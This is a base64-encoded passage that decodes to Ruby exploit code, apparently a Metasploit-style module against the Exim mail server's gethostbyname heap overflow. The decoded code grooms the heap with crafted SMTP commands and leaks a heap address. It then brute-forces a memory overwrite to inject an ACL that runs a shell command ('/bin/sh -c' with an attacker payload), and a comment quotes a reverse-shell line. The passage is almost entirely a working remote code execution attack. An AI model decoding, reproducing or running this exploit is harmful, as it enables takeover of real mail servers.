KVswXSAmIDMpID09IDApIGFuZCAjIGZkDQogICAgICAgICAgICAgICAgKGVycm9yWzJdID1+IC9cQTUwMyBbXnNdLj9cei9tbikgYW5kICgoZXJyb3JbMl0udW5wYWNrKCdDKicpWzRdICYgNykgPT0gUFJFVl9JTlVTRSkgYW5kICMgc2l6ZQ0KICAgICAgICAgICAgICAgIChlcnJvclszXSA9PSAiMTc3IikgIyB0aGUgbGFzdCBceDdGIG9mIG91ciBCQUQxIGNvbW1hbmQsIGVuY29kZWQgYXMgXFwxNzcgYnkgc3RyaW5nX3ByaW50aW5nKCkNCiAgICAgICAgICAgIGxlYWtlZF9hcmNoID0gQVJDSF9YODYNCg0KICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgIHRocm93KDphbm90aGVyX2hlYXBfc2hpZnQpDQogICAgICAgICAgZW5kDQogICAgICAgICAgcHJpbnRfZGVidWcoIiN7eyBsZWFrZWRfYXJjaDogbGVha2VkX2FyY2ggfX0iKQ0KICAgICAgICAgIGZhaWxfd2l0aCgiaW5mb2xlYWsiLCAiYXJjaCBjaGFuZ2VkIikgaWYgX2xlYWtlZF9hcmNoIGFuZCBfbGVha2VkX2FyY2ggIT0gbGVha2VkX2FyY2gNCg0KICAgICAgICAgICMgdHJ5IGRpZmZlcmVudCBsYXJnZS1iaW5zOiBtb3N0IG9mIHRoZW0gc2hvdWxkIGJlIGVtcHR5LA0KICAgICAgICAgICMgc28ga2VlcCB0aGUgbW9zdCBmcmVxdWVudCBmZF9uZXh0c2l6ZSBhZGRyZXNzDQogICAgICAgICAgIyAoYSBwb2ludGVyIHRvIHRoZSBtYWxsb2NfY2h1bmsgaXRzZWxmKQ0KDQogICAgICAgICAgY291bnQgPSBIYXNoLm5ldygwKQ0KICAgICAgICAgIDAudXB0byg5KSBkbyB8bGFzdF9kaWdpdHwNCiAgICAgICAgICAgIGVycm9yID0gdHJ5X2luZm9ybWF0aW9uX2xlYWsoaGVhcF9zaGlmdCwgd3JpdGVfb2Zmc2V0LCBsYXN0X2RpZ2l0KQ0KICAgICAgICAgICAgbmV4dCBpZiBub3QgZXJyb3Igb3IgZXJyb3IubGVuZ3RoIDwgMiAjIGhlYXBfc2hpZnQgY2FuIGZpeCB0aGUgMiBsZWFzdCBzaWduaWZpY2FudCBOVUwgYnl0ZXMNCiAgICAgICAgICAgIG5leHQgaWYgKGVycm9yLnVucGFjaygnQycpWzBdICYgKGxlYWtlZF9hcmNoID09IEFSQ0hfWDg2ID8gNyA6IDE1KSkgIT0gMCAjIE1BTExPQ19BTElHTl9NQVNLDQogICAgICAgICAgICBjb3VudFtlcnJvcl0gKz0gMQ0KICAgICAgICAgIGVuZA0KICAgICAgICAgIHByaW50X2RlYnVnKCIje3sgY291bnQ6IGNvdW50IH19IikNCiAgICAgICAgICB0aHJvdyg6YW5vdGhlcl9oZWFwX3NoaWZ0KSBpZiBjb3VudC5lbXB0eT8NCg0KICAgICAgICAgICMgY29udmVydCBjb3VudCB0byBhIG5lc3RlZCBhcnJheSBvZiBba2V5LCB2YWx1ZV0gYXJyYXlzIGFuZCBzb3J0IGl0DQogICAgICAgICAgZXJyb3JfY291bnQgPSBjb3VudC5zb3J0IHsgfGEsIGJ8IGJbMV0gPD0+IGFbMV0gfQ0KICAgICAgICAgIGVycm9yX2NvdW50ID0gZXJyb3JfY291bnQuZmlyc3QgIyBtb3N0IGZyZXF1ZW50DQogICAgICAgICAgZXJyb3IgPSBlcnJvcl9jb3VudFswXQ0KICAgICAgICAgIGNvdW50ID0gZXJyb3JfY291bnRbMV0NCiAgICAgICAgICB0aHJvdyg6YW5vdGhlcl9oZWFwX3NoaWZ0KSB1bmxlc3MgY291bnQgPj0gNiAjIG1ham9yaXR5DQogICAgICAgICAgbGVha2VkX2FkZHIucHVzaCh7IGVycm9yOiBlcnJvciwgc2hpZnQ6IGhlYXBfc2hpZnQgfSkNCg0KICAgICAgICAgICMgY29tbW9uLWNhc2Ugc2hvcnRjdXQNCiAgICAgICAgICBpZiAobGVha2VkX2FyY2ggPT0gQVJDSF9YODYgYW5kIGVycm9yWzAsNF0gPT0gZXJyb3JbNCw0XSBhbmQgZXJyb3JbOC4uLTFdID09ICJlciBub3QgeWV0IGdpdmVuIikgb3INCiAgICAgICAgICAgICAobGVha2VkX2FyY2ggPT0gQVJDSF9YODZfNjQgYW5kIGVycm9yLmxlbmd0aCA9PSA2IGFuZCBlcnJvcls1XS5jb3VudCgiXHg3RS1ceDdGIikubm9uemVybz8pDQogICAgICAgICAgICBsZWFrZWRfYWRkciA9IFtsZWFrZWRfYWRkci5sYXN0XSAjIHVzZSB0aGlzIG9uZSwgYW5kIG5vdCBhbm90aGVyDQogICAgICAgICAgICB0aHJvdyg6YW5vdGhlcl9oZWFwX3NoaWZ0LCB0cnVlKSAjIGRvbmUNCiAgICAgICAgICBlbmQNCiAgICAgICAgICB0aHJvdyg6YW5vdGhlcl9oZWFwX3NoaWZ0KQ0KICAgICAgICBlbmQNCiAgICAgICAgdGhyb3coOmFub3RoZXJfaGVhcF9zaGlmdCkNCiAgICAgIGVuZA0KICAgICAgYnJlYWsgaWYgZG9uZQ0KICAgIGVuZA0KDQogICAgZmFpbF93aXRoKCJpbmZvbGVhayIsICJub3QgdnVsbj8gb2xkIGdsaWJjPyAobm8gbGVha2VkX2FyY2gpIikgaWYgbGVha2VkX2FyY2gubmlsPw0KICAgIGZhaWxfd2l0aCgiaW5mb2xlYWsiLCAiTlVMLCBDUiwgTEYgaW4gYWRkcj8gKG5vIGxlYWtlZF9hZGRyKSIpIGlmIGxlYWtlZF9hZGRyLmVtcHR5Pw0KDQogICAgbGVha2VkX2FkZHIuc29ydCEgeyB8YSwgYnwgYls6ZXJyb3JdLmxlbmd0aCA8PT4gYVs6ZXJyb3JdLmxlbmd0aCB9DQogICAgbGVha2VkX2FkZHIgPSBsZWFrZWRfYWRkci5maXJzdCAjIGxvbmdlc3QNCiAgICBlcnJvciA9IGxlYWtlZF9hZGRyWzplcnJvcl0NCiAgICBzaGlmdCA9IGxlYWtlZF9hZGRyWzpzaGlmdF0NCg0KICAgIGxlYWtlZF9hZGRyID0gMA0KICAgIChsZWFrZWRfYXJjaCA9PSBBUkNIX1g4NiA/IDQgOiA4KS50aW1lcyBkbyB8aXwNCiAgICAgIGJyZWFrIGlmIGkgPj0gZXJyb3IubGVuZ3RoDQogICAgICBsZWFrZWRfYWRkciArPSBlcnJvci51bnBhY2soJ0MqJylbaV0gKiAoMioqKGkqOCkpDQogICAgZW5kDQogICAgIyBsZWFrZWRfYWRkciBzaG91bGQgcG9pbnQgdG8gdGhlIGJlZ2lubmluZyBvZiBFeGltJ3Mgc210cF9jbWRfYnVmZmVyOg0KICAgIGxlYWtlZF9hZGRyIC09IDIqU01UUF9DTURfQlVGRkVSX1NJWkUgKyBJTl9CVUZGRVJfU0laRSArIDQqKDExKjEwMjQrc2hpZnQpICsgMyoxMDI0ICsgU1RPUkVfQkxPQ0tfU0laRQ0KICAgIGZhaWxfd2l0aCgiaW5mb2xlYWsiLCAiTlVMLCBDUiwgTEYgaW4gYWRkcj8gKG5vIGxlYWtlZF9hZGRyKSIpIGlmIGxlYWtlZF9hZGRyIDw9IE1NQVBfTUlOX0FERFINCg0KICAgIHByaW50X2dvb2QoIlN1Y2Nlc3NmdWxseSBsZWFrZWRfYXJjaDogI3tsZWFrZWRfYXJjaH0iKQ0KICAgIHByaW50X2dvb2QoIlN1Y2Nlc3NmdWxseSBsZWFrZWRfYWRkcjogI3tsZWFrZWRfYWRkci50b19zKDE2KX0iKQ0KICAgIEBsZWFrZWQgPSB7IGFyY2g6IGxlYWtlZF9hcmNoLCBhZGRyOiBsZWFrZWRfYWRkciB9DQogIGVuZA0KDQogIGRlZiB0cnlfaW5mb3JtYXRpb25fbGVhayhoZWFwX3NoaWZ0LCB3cml0ZV9vZmZzZXQsIGxhc3RfZGlnaXQgPSA5KQ0KICAgIGZhaWxfd2l0aCgiaW5mb2xlYWsiLCAiaGVhcF9zaGlmdCIpIGlmIChoZWFwX3NoaWZ0IDwgTUlOX0hFQVBfU0hJRlQpDQogICAgZmFpbF93aXRoKCJpbmZvbGVhayIsICJoZWFwX3NoaWZ0IikgaWYgKGhlYXBfc2hpZnQgJiAxNSkgIT0gMA0KICAgIGZhaWxfd2l0aCgiaW5mb2xlYWsiLCAid3JpdGVfb2Zmc2V0IikgaWYgKHdyaXRlX29mZnNldCAmIDcpICE9IDANCiAgICBmYWlsX3dpdGgoImluZm9sZWFrIiwgImxhc3RfZGlnaXQiKSBpZiAiI3tsYXN0X2RpZ2l0fSIgIX4gL1xBWzAtOV1cei8NCg0KICAgIHNtdHBfY29ubmVjdA0KDQogICAgIyBidWxsZXRwcm9vZiBIZWFwIEZlbmcgU2h1aTsgdGhlIGhhcmQgcGFydCBpcyBhdm9pZGluZzoNCiAgICAjICJUb28gbWFueSBzeW50YXggb3IgcHJvdG9jb2wgZXJyb3JzIiAoMykNCiAgICAjICJUb28gbWFueSB1bnJlY29nbml6ZWQgY29tbWFuZHMiICgzKQ0KICAgICMgIlRvbyBtYW55IG5vbm1haWwgY29tbWFuZHMiICgxMCkNCg0KICAgIHNtdHBfc2VuZCgiSEVMTyAiLCAiIiwgIjAiLCBAc2VuZGVyWzpob3N0YWRkcjhdLCAiIiwgMTEqMTAyNCsxMy0xICsgaGVhcF9zaGlmdCkNCiAgICBzbXRwX3JlY3YoMjUwKQ0KDQogICAgc210cF9zZW5kKCJIRUxPICIsICIiLCAiMCIsIEBzZW5kZXJbOmhvc3RhZGRyOF0sICIiLCAzKjEwMjQrMTMtMSkNCiAgICBzbXRwX3JlY3YoMjUwKQ0KDQogICAgc210cF9zZW5kKCJIRUxPICIsICIiLCAiMCIsIEBzZW5kZXJbOmhvc3RhZGRyOF0sICIiLCAzKjEwMjQrMTYrMTMtMSkNCiAgICBzbXRwX3JlY3YoMjUwKQ0KDQogICAgc210cF9zZW5kKCJIRUxPICIsICIiLCAiMCIsIEBzZW5kZXJbOmhvc3RhZGRyOF0sICIiLCA4KjEwMjQrMTYrMTMtMSkNCiAgICBzbXRwX3JlY3YoMjUwKQ0KDQogICAgc210cF9zZW5kKCJIRUxPICIsICIiLCAiMCIsIEBzZW5kZXJbOmhvc3RhZGRyOF0sICIiLCA1KjEwMjQrMTYrMTMtMSkNCiAgICBzbXRwX3JlY3YoMjUwKQ0KDQogICAgIyBvdmVyZmxvdyAoMyBieXRlcykgZ2V0aG9zdGJ5bmFtZSdzIGJ1ZmZlciwgYW5kDQogICAgIyBvdmVyd3JpdGUgaXRzIG5leHRfY2h1bmsncyBzaXplIGZpZWxkIHdpdGggMHgwMDM/MzENCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIF4gbGFzdF9kaWdpdA0KICAgIHNtdHBfc2VuZCgiSEVMTyAiLCAiIiwgIjAiLCAiLjEje2xhc3RfZGlnaXR9IiwgIiIsIDEyKjEwMjQrMy0xICsgaGVhcF9zaGlmdC1NSU5fSEVBUF9TSElGVCkNCiAgICBiZWdpbiAgICAgICAgICAgICAgICAgICAgICAgIyBeIDB4MzAgfCBQUkVWX0lOVVNFDQogICAgICBzbXRwX3JlY3YoSEVMT19DT0RFUykNCg0KICAgICAgc210cF9zZW5kKCJSU0VUIikNCiAgICAgIHNtdHBfcmVjdigyNTApDQoNCiAgICAgIHNtdHBfc2VuZCgiUkNQVCBUTzoiLCAiIiwgbWV0aG9kKDpyYW5kX3RleHRfYWxwaGEpLCAiXHg3RiIsICIiLCAxNSoxMDI0KQ0KICAgICAgc210cF9yZWN2KDUwMywgJ3NlbmRlciBub3QgeWV0IGdpdmVuJykNCg0KICAgICAgc210cF9zZW5kKCIiLCAiQkFEMSAiLCBtZXRob2QoOnJhbmRfdGV4dF9hbHBoYSksICJceDdGXHg3Rlx4N0ZceDdGIiwgIiIsIDEwKjEwMjQtMTYtMSArIHdyaXRlX29mZnNldCkNCiAgICAgIHNtdHBfcmVjdig1MDAsICdcQTUwMCB1bnJlY29nbml6ZWQgY29tbWFuZFxyXG5ceicpDQoNCiAgICAgIHNtdHBfc2VuZCgiQkFEMiAiLCAiIiwgbWV0aG9kKDpyYW5kX3RleHRfYWxwaGEpLCAiXHg3RiIsICIiLCAxNSoxMDI0KQ0KICAgICAgc210cF9yZWN2KDUwMCwgJ1xBNTAwIHVucmVjb2duaXplZCBjb21tYW5kXHJcblx6JykNCg0KICAgICAgc210cF9zZW5kKCJEQVRBIikNCiAgICAgIHJlcGx5ID0gc210cF9yZWN2KDUwMykNCg0KICAgICAgbGluZXMgPSByZXBseVs6bGluZXNdDQogICAgICBmYWlsIGlmIGxpbmVzLnNpemUgPD0gMw0KICAgICAgZmFpbCBpZiBsaW5lc1srMF0gIT0gIjUwMy1BbGwgUkNQVCBjb21tYW5kcyB3ZXJlIHJlamVjdGVkIHdpdGggdGhpcyBlcnJvcjpcclxuIg0KICAgICAgZmFpbCBpZiBsaW5lc1stMl0gIT0gIjUwMy12YWxpZCBSQ1BUIGNvbW1hbmQgbXVzdCBwcmVjZWRlIERBVEFcclxuIg0KICAgICAgZmFpbCBpZiBsaW5lc1stMV0gIT0gIjUwMyBUb28gbWFueSBzeW50YXggb3IgcHJvdG9jb2wgZXJyb3JzXHJcbiINCg0KICAgICAgIyBpZiBsZWFrZWRfYWRkciBjb250YWlucyBMRiwgcmV2ZXJzZSBzbXRwX3Jlc3BvbmQoKSdzIG11bHRpbGluZSBzcGxpdHRpbmcNCiAgICAgICMgKHRoZSAid2hpbGUgKGlzc3BhY2UoKm1zZykpIG1zZysrOyIgbG9vcCBjYW4ndCBiZSBlYXNpbHkgcmV2ZXJzZWQsDQogICAgICAjIGJ1dCBoYXBwZW5zIHdpdGggbG93ZXIgcHJvYmFiaWxpdHkpDQoNCiAgICAgIGVycm9yID0gbGluZXNbKzEuLi0zXS5qb2luKCIiKQ0KICAgICAgZXJyb3Iuc3ViISgvXEE1MDMtL21uLCAiIikNCiAgICAgIGVycm9yLnN1YiEoL1xyXG5cei9tbiwgIiIpDQogICAgICBlcnJvci5nc3ViISgvXHJcbjUwMy0vbW4sICJcbiIpDQogICAgICByZXR1cm4gZXJyb3INCg0KICAgIHJlc2N1ZQ0KICAgICAgcmV0dXJuIG5pbA0KICAgIGVuZA0KDQogIGVuc3VyZQ0KICAgIHNtdHBfZGlzY29ubmVjdA0KICBlbmQNCg0KICBkZWYgY29kZV9leGVjdXRpb24NCiAgICBwcmludF9zdGF0dXMoIlRyeWluZyBjb2RlIGV4ZWN1dGlvbi4uLiIpDQoNCiAgICAjIGNhbid0ICIke3J1bnsvYmluL3NoIC1jICdleGVjIC9iaW4vc2ggLWkgPCYje2J9ID4mMCAyPiYwJ319ICIgYW55bW9yZToNCiAgICAjIERXLzI2IFNldCBGRF9DTE9FWEVDIG9uIFNNVFAgc29ja2V0cyBhZnRlciBmb3JraW5nIGluIHRoZSBkYWVtb24sIHRvIGVuc3VyZQ0KICAgICMgICAgICAgdGhhdCByb2d1ZSBjaGlsZCBwcm9jZXNzZXMgY2Fubm90IHVzZSB0aGVtLg0KDQogICAgZmFpbF93aXRoKCJjb2RlZXhlYyIsICJlbmNvZGVkIHBheWxvYWQiKSBpZiBwYXlsb2FkLnJhdyAhPSBwYXlsb2FkLmVuY29kZWQNCiAgICBmYWlsX3dpdGgoImNvZGVleGVjIiwgImludmFsaWQgcGF5bG9hZCIpIGlmIHBheWxvYWQucmF3LmVtcHR5PyBvciBwYXlsb2FkLnJhdy5jb3VudCgiXlx4MjAtXHg3RSIpLm5vbnplcm8/DQogICAgIyBFeGltIHByb2Nlc3NlcyBvdXIgcnVuLUFDTCB3aXRoIGV4cGFuZF9zdHJpbmcoKSBmaXJzdCAoaGVuY2UgdGhlIFtcJFx7XH1cXF0gZXNjYXBlcyksDQogICAgIyBhbmQgdHJhbnNwb3J0X3NldF91cF9jb21tYW5kKCksIHN0cmluZ19kZXF1b3RlKCkgbmV4dCAoaGVuY2UgdGhlIFtcIlxcXSBlc2NhcGVzKS4NCiAgICBlbmNvZGVkID0gcGF5bG9hZC5yYXcuZ3N1YigvW1wiXFxdLywgJ1xcXFxcXCYnKS5nc3ViKC9bXCRce1x9XFxdLywgJ1xcXFxcXCYnKQ0KICAgICMgc2V0c2lkIGJlY2F1c2Ugb2YgRXhpbSdzICJraWxscGcocGlkLCBTSUdLSUxMKTsiIGFmdGVyICJhbGFybSg2MCk7Ig0KICAgIGNvbW1hbmQgPSAnJHtydW57L3Vzci9iaW4vZW52IHNldHNpZCAvYmluL3NoIC1jICInICsgZW5jb2RlZCArICcifX0nDQogICAgcHJpbnRfZGVidWcoY29tbWFuZCkNCg0KICAgICMgZG9uJ3QgdHJ5IHRvIGV4ZWN1dGUgY29tbWFuZHMgZGlyZWN0bHksIHRyeSBhIHZlcnkgc2ltcGxlIEFDTCBmaXJzdCwNCiAgICAjIHRvIGRpc3Rpbmd1aXNoIGJldHdlZW4gZXhwbG9pdGF0aW9uLXByb2JsZW1zIGFuZCBzaGVsbGNvZGUtcHJvYmxlbXMNCg0KICAgIGFjbGRyb3AgPSAiZHJvcCBtZXNzYWdlPSINCiAgICBtZXNzYWdlID0gcmFuZF90ZXh0X2FscGhhKGNvbW1hbmQubGVuZ3RoIC0gYWNsZHJvcC5sZW5ndGgpDQogICAgYWNsZHJvcCArPSBtZXNzYWdlDQoNCiAgICBtYXhfcmFuZF9vZmZzZXQgPSAoQGxlYWtlZFs6YXJjaF0gPT0gQVJDSF9YODYgPyAzMiA6IDY0KQ0KICAgIG1heF9oZWFwX2FkZHIgPSBAbGVha2VkWzphZGRyXQ0KICAgIG1pbl9oZWFwX2FkZHIgPSBuaWwNCiAgICBzdXJ2aXZlZCA9IG5pbA0KDQogICAgIyB3ZSBsYXRlciBmaWxsIGxvZ19idWZmZXIgYW5kIGJpZ19idWZmZXIgd2l0aCBhbHBoYSBjaGFycywNCiAgICAjIHdoaWNoIGNyZWF0ZXMgYSBzYWZlLXpvbmUgYXQgdGhlIGJlZ2lubmluZyBvZiB0aGUgaGVhcCwNCiAgICAjIHdoZXJlIHdlIGNhbid0IHBvc3NpYmx5IGNyYXNoIGR1cmluZyBvdXIgYnJ1dGUtZm9yY2UNCg0KICAgICMgNCwgYmVjYXVzZSAzIGNvcGllcyBvZiBzZW5kZXJfaGVsb19uYW1lLCBhbmQgc3RlcF9sZW47DQogICAgIyBzdGFydCBiaWcsIGJ1dCByZWZpbmUgbGl0dGxlIGJ5IGxpdHRsZSBpbiBjYXNlDQogICAgIyB3ZSBjcmFzaCBiZWNhdXNlIHdlIG92ZXJ3cml0ZSBpbXBvcnRhbnQgZGF0YQ0KDQogICAgaGVsb19sZW4gPSAoTE9HX0JVRkZFUl9TSVpFICsgQklHX0JVRkZFUl9TSVpFKSAvIDQNCiAgICBsb29wIGRvDQoNCiAgICAgIHNlbmRlcl9oZWxvX25hbWUgPSAiQSIgKiBoZWxvX2xlbg0KICAgICAgYWRkcmVzcyA9IHNwcmludGYoIlslc106JWQiLCBAc2VuZGVyWzpob3N0YWRkcl0sIDY1NTM1KQ0KDQogICAgICAjIHRoZSAzIGNvcGllcyBvZiBzZW5kZXJfaGVsb19uYW1lLCBhbGxvY2F0ZWQgYnkNCiAgICAgICMgaG9zdF9idWlsZF9zZW5kZXJfZnVsbGhvc3QoKSBpbiBQT09MX1BFUk0gbWVtb3J5DQoNCiAgICAgIGhlbG9faXBfc2l6ZSA9IEFMSUdOTUVOVCArDQogICAgICAgIHNlbmRlcl9oZWxvX25hbWVbKzEuLi0yXS5sZW5ndGgNCg0KICAgICAgc2VuZGVyX2Z1bGxob3N0X3NpemUgPSBBTElHTk1FTlQgKw0KICAgICAgICBzcHJpbnRmKCIlcyAoJXMpICVzIiwgQHNlbmRlcls6aG9zdG5hbWVdLCBzZW5kZXJfaGVsb19uYW1lLCBhZGRyZXNzKS5sZW5ndGgNCg0KICAgICAgc2VuZGVyX3Jjdmhvc3Rfc2l6ZSA9IEFMSUdOTUVOVCArICgoQHNlbmRlcls6aWRlbnRdID09IG5pbCkgPw0KICAgICAgICBzcHJpbnRmKCIlcyAoJXMgaGVsbz0lcykiLCBAc2VuZGVyWzpob3N0bmFtZV0sIGFkZHJlc3MsIHNlbmRlcl9oZWxvX25hbWUpIDoNCiAgICAgICAgc3ByaW50ZigiJXNcblx0KCVzIGhlbG89JXMgaWRlbnQ9JXMpIiwgQHNlbmRlcls6aG9zdG5hbWVdLCBhZGRyZXNzLCBzZW5kZXJfaGVsb19uYW1lLCBAc2VuZGVyWzppZGVudF0pDQogICAgICApLmxlbmd0aA0KDQogICAgICAjIGZpdCBjb21wbGV0ZWx5IGludG8gdGhlIHNhZmUtem9uZQ0KICAgICAgc3RlcF9sZW4gPSAoTE9HX0JVRkZFUl9TSVpFICsgQklHX0JVRkZFUl9TSVpFKSAtDQogICAgICAgIChtYXhfcmFuZF9vZmZzZXQgKyBoZWxvX2lwX3NpemUgKyBzZW5kZXJfZnVsbGhvc3Rfc2l6ZSArIHNlbmRlcl9yY3Zob3N0X3NpemUpDQogICAgICBsb29wIGRvDQoNCiAgICAgICAgIyBpbnNpZGUgc210cF9jbWRfYnVmZmVyICh3ZSBsYXRlciBmaWxsIHNtdHBfY21kX2J1ZmZlciBhbmQgc210cF9kYXRhX2J1ZmZlcg0KICAgICAgICAjIHdpdGggYWxwaGEgY2hhcnMsIHdoaWNoIGNyZWF0ZXMgYW5vdGhlciBzYWZlLXpvbmUgYXQgdGhlIGVuZCBvZiB0aGUgaGVhcCkNCiAgICAgICAgaGVhcF9hZGRyID0gbWF4X2hlYXBfYWRkcg0KICAgICAgICBsb29wIGRvDQoNCiAgICAgICAgICAjIHRyeSBoYXJkZXIgdGhlIGZpcnN0IHRpbWUgYXJvdW5kOiB3ZSBvYnRhaW4gYmV0dGVyDQogICAgICAgICAgIyBoZWFwIGJvdW5kYXJpZXMsIGFuZCB3ZSB1c3VhbGx5IGhpdCBvdXIgQUNMIGZhc3Rlcg0KDQogICAgICAgICAgKG1pbl9oZWFwX2FkZHIgPyAxIDogMikudGltZXMgZG8NCg0KICAgICAgICAgICAgIyB0cnkgdGhlIHNhbWUgaGVhcF9hZGRyIHNldmVyYWwgdGltZXMsIGJ1dCB3aXRoIGRpZmZlcmVudCByYW5kb20gb2Zmc2V0cywNCiAgICAgICAgICAgICMgaW4gY2FzZSB3ZSBjcmFzaCBiZWNhdXNlIG91ciBoaWphY2tlZCBzdG9yZWJsb2NrJ3MgbGVuZ3RoIGZpZWxkIGlzIHRvbyBzbWFsbA0KICAgICAgICAgICAgIyAod2UgZG9uJ3QgY29udHJvbCB3aGF0J3Mgc3RvcmVkIGF0IGhlYXBfYWRkcikNCg0KICAgICAgICAgICAgcmFuZF9vZmZzZXQgPSByYW5kKG1heF9yYW5kX29mZnNldCkNCiAgICAgICAgICAgIHByaW50X2RlYnVnKCIje3sgaGVsbzogaGVsb19sZW4sIHN0ZXA6IHN0ZXBfbGVuLCBhZGRyOiBoZWFwX2FkZHIudG9fcygxNiksIG9mZnNldDogcmFuZF9vZmZzZXQgfX0iKQ0KICAgICAgICAgICAgcmVwbHkgPSB0cnlfY29kZV9leGVjdXRpb24oaGVsb19sZW4sIGFjbGRyb3AsIGhlYXBfYWRkciArIHJhbmRfb2Zmc2V0KQ0KICAgICAgICAgICAgcHJpbnRfZGVidWcoIiN7eyByZXBseTogcmVwbHkgfX0iKSBpZiByZXBseQ0KDQogICAgICAgICAgICBpZiByZXBseSBhbmQNCiAgICAgICAgICAgICAgIHJlcGx5Wzpjb2RlXSA9PSAiNTUwIiBhbmQNCiAgICAgICAgICAgICAgICMgZGV0ZWN0IHRoZSBwYXJzZWQgQUNMLCBub3QgdGhlICJzdGlsbCBpbiB0ZXh0IGZvcm0iIEFDTCAod2l0aCAiPSIpDQogICAgICAgICAgICAgICByZXBseVs6bGluZXNdLmpvaW4oIiIpLmRlbGV0ZSgiXj1BLVphLXoiKSA9fiAvKFxBfFtePV0pI3ttZXNzYWdlfS9tbg0KICAgICAgICAgICAgICBwcmludF9nb29kKCJCcnV0ZS1mb3JjZSBTVUNDRVNTIikNCiAgICAgICAgICAgICAgcHJpbnRfZ29vZCgiUGxlYXNlIHdhaXQgZm9yIHJlcGx5Li4uIikNCiAgICAgICAgICAgICAgIyBleGVjdXRlIGNvbW1hbmQgdGhpcyB0aW1lLCBub3QgYWNsZHJvcA0KICAgICAgICAgICAgICByZXBseSA9IHRyeV9jb2RlX2V4ZWN1dGlvbihoZWxvX2xlbiwgY29tbWFuZCwgaGVhcF9hZGRyICsgcmFuZF9vZmZzZXQpDQogICAgICAgICAgICAgIHByaW50X2RlYnVnKCIje3sgcmVwbHk6IHJlcGx5IH19IikNCiAgICAgICAgICAgICAgcmV0dXJuIGhhbmRsZXINCiAgICAgICAgICAgIGVuZA0KDQogICAgICAgICAgICBpZiBub3QgbWluX2hlYXBfYWRkcg0KICAgICAgICAgICAgICBpZiByZXBseQ0KICAgICAgICAgICAgICAgIGZhaWxfd2l0aCgiY29kZWV4ZWMiLCAibm8gbWluX2hlYXBfYWRkciIpIGlmIChtYXhfaGVhcF9hZGRyIC0gaGVhcF9hZGRyKSA+PSBNQVhfSEVBUF9TSVpFDQogICAgICAgICAgICAgICAgc3Vydml2ZWQgPSBoZWFwX2FkZHINCiAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIGlmICgoc3Vydml2ZWQgPyBzdXJ2aXZlZCA6IG1heF9oZWFwX2FkZHIpIC0gaGVhcF9hZGRyKSA+PSBNSU5fSEVBUF9TSVpFDQogICAgICAgICAgICAgICAgICAjIHN1cnZpdmVkIHNob3VsZCBwb2ludCB0byBvdXIgc2FmZS16b25lIGF0IHRoZSBiZWdpbm5pbmcgb2YgdGhlIGhlYXANCiAgICAgICAgICAgICAgICAgIGZhaWxfd2l0aCgiY29kZWV4ZWMiLCAibmV2ZXIgc3Vydml2ZWQiKSBpZiBub3Qgc3Vydml2ZWQNCiAgICAgICAgICAgICAgICAgIHByaW50X2dvb2QgIkJydXRlLWZvcmNlZCBtaW5faGVhcF9hZGRyOiAje3N1cnZpdmVkLnRvX3MoMTYpfSINCiAgICAgICAgICAgICAgICAgIG1pbl9oZWFwX2FkZHIgPSBzdXJ2aXZlZA0KICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgIGVuZA0KICAgICAgICAgIGVuZA0KDQogICAgICAgICAgaGVhcF9hZGRyIC09IHN0ZXBfbGVuDQogICAgICAgICAgYnJlYWsgaWYgbWluX2hlYXBfYWRkciBhbmQgaGVhcF9hZGRyIDwgbWluX2hlYXBfYWRkcg0KICAgICAgICBlbmQNCg0KICAgICAgICBicmVhayBpZiBzdGVwX2xlbiA8IDEwMjQNCiAgICAgICAgc3RlcF9sZW4gLz0gMg0KICAgICAgZW5kDQoNCiAgICAgIGhlbG9fbGVuIC89IDINCiAgICAgIGJyZWFrIGlmIGhlbG9fbGVuIDwgMTAyNA0KICAgICAgIyBeIG90aGVyd2lzZSB0aGUgMyBjb3BpZXMgb2Ygc2VuZGVyX2hlbG9fbmFtZSB3aWxsDQogICAgICAjIGZpdCBpbnRvIHRoZSBjdXJyZW50X2Jsb2NrIG9mIFBPT0xfUEVSTSBtZW1vcnkNCiAgICBlbmQNCiAgICBmYWlsX3dpdGgoImNvZGVleGVjIiwgIkJydXRlLWZvcmNlIEZBSUxVUkUiKQ0KICBlbmQNCg0KICAjIG91ciB3cml0ZS13aGF0LXdoZXJlIHByaW1pdGl2ZQ0KICBkZWYgdHJ5X2NvZGVfZXhlY3V0aW9uKGxlbiwgd2hhdCwgd2hlcmUpDQogICAgZmFpbF93aXRoKCJjb2RlZXhlYyIsICIje3doYXQubGVuZ3RofSA+PSAje2xlbn0iKSBpZiB3aGF0Lmxlbmd0aCA+PSBsZW4NCiAgICBmYWlsX3dpdGgoImNvZGVleGVjIiwgIiN7d2hlcmV9IDwgMCIpIGlmIHdoZXJlIDwgMA0KDQogICAgeDg2ID0gKEBsZWFrZWRbOmFyY2hdID09IEFSQ0hfWDg2KQ0KICAgIG1pbl9oZWFwX3NoaWZ0ID0gKHg4NiA/IDUxMiA6IDc2OCkgIyBhdCBsZWFzdCByZXF1ZXN0MnNpemUoc2l6ZW9mKEZJTEUpKQ0KICAgIGhlYXBfc2hpZnQgPSBtaW5faGVhcF9zaGlmdCArIHJhbmQoMTAyNCAtIG1pbl9oZWFwX3NoaWZ0KQ0KICAgIGxhc3RfZGlnaXQgPSAxICsgcmFuZCg5KQ0KDQogICAgc210cF9jb25uZWN0DQoNCiAgICAjIGZpbGwgc210cF9jbWRfYnVmZmVyLCBzbXRwX2RhdGFfYnVmZmVyLCBhbmQgYmlnX2J1ZmZlciB3aXRoIGFscGhhIGNoYXJzDQogICAgc210cF9zZW5kKCJNQUlMIEZST006IiwgIiIsIG1ldGhvZCg6cmFuZF90ZXh0X2FscGhhKSwgIjwje3JhbmRfdGV4dF9hbHBoYV91cHBlcig4KX0+IiwgIiIsIEJJR19CVUZGRVJfU0laRSAtDQogICAgICAgICAgICAgIjUwMSA6IHNlbmRlciBhZGRyZXNzIG11c3QgY29udGFpbiBhIGRvbWFpblxyXG5cMCIubGVuZ3RoKQ0KICAgIHNtdHBfcmVjdig1MDEsICdzZW5kZXIgYWRkcmVzcyBtdXN0IGNvbnRhaW4gYSBkb21haW4nKQ0KDQogICAgc210cF9zZW5kKCJSU0VUIikNCiAgICBzbXRwX3JlY3YoMjUwKQ0KDQogICAgIyBidWxsZXRwcm9vZiBIZWFwIEZlbmcgU2h1aTsgdGhlIGhh